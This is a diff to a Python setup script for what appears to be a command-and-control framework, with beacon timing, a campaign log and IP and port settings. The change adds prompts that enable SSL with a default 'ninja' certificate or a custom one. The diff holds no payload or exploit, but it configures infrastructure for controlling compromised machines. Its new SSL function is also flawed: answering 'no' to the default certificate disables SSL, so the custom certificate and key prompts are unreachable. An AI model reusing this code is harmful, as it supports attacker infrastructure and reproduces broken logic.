@@ -4,7 +4,9 @@ import random
 beacon=''
 IP=''
 PORT=''
-beacon=''
+SSL=''
+cert=''
+key=''
 
 def initiate_url():
     global Urls
@@ -75,7 +77,7 @@ def update_template():
     template=open("core/config.template","r")
     config=open("core/config.py","w")
     data=template.read()
-    data=data.replace('{IP}', IP).replace('{beacon_time}', beacon).replace('{PORT}', PORT).replace('{URL}', Urls)
+    data=data.replace('{IP}', IP).replace('{beacon_time}', beacon).replace('{PORT}', PORT).replace('{URL}', Urls).replace('{SSL}', SSL).replace('{CERT}', cert).replace('{KEY}', key)
     config.write(data)
     config.close()
     template.close()
@@ -91,11 +93,47 @@ def log_campaign():
     file=open("c2-logs.txt","a+")
     file.write(Log)
     file.close()
+
+def get_ssl():
+    global SSL,key,cert
+    CC=''
+    while len(CC) == 0:
+        CC = raw_input('Do you want to use SSL ? (yes/no) ')
+        if CC=="yes":
+            SSL="True"
+            break
+        if CC=="no":
+            SSL="False"
+            return
+        else:
+            continue
+    CC=''
+    while len(CC) == 0:
+        CC = raw_input('Do you want to use default self signed SSL certificate  ? (yes/no) ')
+        if CC=="yes":
+            cert='ninja.crt'
+            key='ninja.key'
+            return
+        if CC=="no":
+            SSL="False"
+            return
+        else:
+            continue
+    CC=''
+    while len(CC) == 0:
+        CC = raw_input('Enter the full path for certificate ( ex : /root/certificate.crt ) ')
+    cert=CC
+    CC=''
+    while len(CC) == 0:
+        CC = raw_input('Enter the full path for private key ( ex : /root/private.key ) ')
+    key=CC
+
 if __name__ == '__main__':
     try :
         initiate_url()
         get_ip()
         get_beacon()
+        get_ssl()
         update_template()
         log_campaign()
     except Exception as e:
